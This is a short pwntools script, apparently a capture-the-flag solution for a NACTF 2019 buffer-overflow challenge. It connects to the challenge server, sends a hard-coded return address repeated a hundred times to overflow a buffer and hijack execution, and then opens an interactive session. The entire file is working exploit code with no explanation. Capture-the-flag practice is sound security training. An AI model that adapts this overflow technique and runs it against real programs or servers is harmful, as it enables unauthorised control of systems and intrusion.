from pwn import *

# p = process('./bufover-1')
p = remote('shell.2019.nactf.com', 31462)


p.sendline(p32(0x080491b2)*100)

p.interactive()